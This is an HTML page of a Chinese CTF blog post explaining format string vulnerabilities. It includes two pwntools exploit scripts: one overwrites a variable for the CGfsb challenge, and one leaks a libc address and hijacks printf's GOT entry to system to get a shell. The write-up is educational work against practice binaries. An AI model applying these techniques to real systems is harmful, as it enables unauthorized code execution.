@@ -1,0 +1,184 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>格式化字符串漏洞的简单利用 - 赵丰年-全世界都知道我很低调</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="赵丰年,"> 
+    <meta name="description" content="格式化字符串格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。对格式化字符串函数利用不当，会造成格式化字符串漏洞！比如printf(str)这样子！常见,"> 
+    <meta name="author" content="赵丰年de博客"> 
+    <link rel="alternative" href="atom.xml" title="赵丰年-全世界都知道我很低调" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">赵丰年-全世界都知道我很低调</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://xiy-blogs.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">格式化字符串漏洞的简单利用</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">格式化字符串漏洞的简单利用</h1>
+        <div class="stuff">
+            <span>二月 28, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。对格式化字符串函数利用不当，会造成格式化字符串漏洞！比如<code>printf(str)</code>这样子！常见的格式化字符串函数有<code>printf , scanf ,fprintf</code>等等。通常可以用LazyIDA插件检测格式化字符串漏洞。</p>
+<h2 id="常见利用方式"><a href="#常见利用方式" class="headerlink" title="常见利用方式"></a>常见利用方式</h2><ol>
+<li>泄露内存地址</li>
+<li>任意地址写入</li>
+</ol>
+<h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><p>攻防世界CGfsb<br>首先看下保护措施<br><img src="https://i.loli.net/2020/02/28/Oro4D5nqgBUEjIc.png" alt="a14.png"><br>虽然有点绿，但是不要慌，扔IDA看看<br><img src="https://i.loli.net/2020/02/28/A9Ia6rlCXkpmV5F.png" alt="a15.png"><br>只要满足pwnme的值为8就能拿到flag,同时第二个printf存在一个格式化字符串漏洞，我们可以利用其写入。<br>ok，首先确定偏移量,运行程序操作一手<br><img src="https://i.loli.net/2020/02/28/ZmDgeoUsNIf8H62.png" alt="a16.png"><br>我们发现aaaa的十六进制数据在第10位，即偏移量为10<br>ok开始写exp,我们利用pwntools实现写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*        </span><br><span class="line">r &#x3D; remote(&#39;111.198.29.45&#39;,37185)</span><br><span class="line">r.recvuntil(&#39;name:&#39;)</span><br><span class="line">r.sendline(&#39;aaaa&#39;)</span><br><span class="line">payload &#x3D; fmtstr_payload(10,&#123;0x804a068:8&#125;)</span><br><span class="line">r.recvuntil(&#39;:&#39;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>下面看利用该漏洞实现泄露内存地址的案例<br>首先看下保护机制<br><img src="https://i.loli.net/2020/02/28/Gv3eIl2rkKRbV4W.png" alt="a16 _1_.png"><br>扔IDA<br><img src="https://i.loli.net/2020/02/28/QfF74utLw2HybRk.png" alt="A17.png"><br><img src="https://i.loli.net/2020/02/28/UhP8QJKkbOtWXgS.png" alt="A18.png"><br>嘿嘿，存在个格式化字符串漏洞，继续看，shfit +f12<br><img src="https://i.loli.net/2020/02/28/AwNmeznyTYHdvcG.png" alt="a19.png"><br>啥子也么得，而且我怀疑他是动态编译，验证下<br><img src="https://i.loli.net/2020/02/28/b5Utdh61mBDa4cy.png" alt="a20.png"><br>我们发现它在不断变化，所以他确实是动态编译的，这时候要考虑用printf泄露函数真实地址，算出libc的基地址，利用<code>add = libc_base + libc_offset</code>即真实地址等于基地址加偏移地址，然后构造system的真实地址，再进行一波got表劫持，拿到shell<br>ok开始搞事情，首先确定偏移<br><img src="https://i.loli.net/2020/02/28/1WfMlCmb6cexqrE.png" alt="a21.png"><br>可以看出来偏移为5，ok，这里我选择泄露<code>__libc_start_main</code>的地址，我们利用pwntools的elf模块来寻找其偏移地址，用objdump寻找其got地址，然后泄露该地址的内容，即真实地址。<br>有图有真相：<code>objdump -d -M intel fmt1</code><br><img src="https://i.loli.net/2020/02/28/keGwRyNVQISWZKo.png" alt="a22.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#r &#x3D; remote(&#39;127.0.0.1&#39;,10001)</span><br><span class="line">r &#x3D; process(&#39;.&#x2F;fmt1&#39;)</span><br><span class="line"></span><br><span class="line">elf &#x3D; ELF(&#39;&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc.so.6&#39;)</span><br><span class="line">libc_start_got &#x3D; 0x804a01c</span><br><span class="line">libc_offsset &#x3D; elf.symbols[&#39;__libc_start_main&#39;]</span><br><span class="line"></span><br><span class="line">r.sendline(p32(libc_start_got) + &#39;#&#39; + &#39;%5$s&#39; + &#39;#&#39;)	&#x2F;&#x2F;读取其数据</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#39;#&#39;)</span><br><span class="line">libc_add &#x3D; u32(r.recvuntil(&#39;#&#39;)[:4])</span><br><span class="line">libc_base &#x3D; libc_add - libc_offsset</span><br><span class="line"></span><br><span class="line">printf_got &#x3D; 0x804a00c</span><br><span class="line">system_off &#x3D; elf.symbols[&#39;system&#39;]</span><br><span class="line">system &#x3D; libc_base + system_off</span><br><span class="line"></span><br><span class="line">r.sendline(fmtstr_payload(5,&#123;printf_got:system&#125;))		&#x2F;&#x2F;将system地址写入printf,当执行printf时就会拿到shell</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='https://link.hhtjim.com/163/469073083.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='9795acb241b5abfffb0a'
+        data-cs='660e7056618084a8a8046e8e2e9e78787cdb23cf'
+        data-r='XIY-blogs.github.io'
+        data-o='XIY-blogs'
+        data-a='XIY-blogs'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
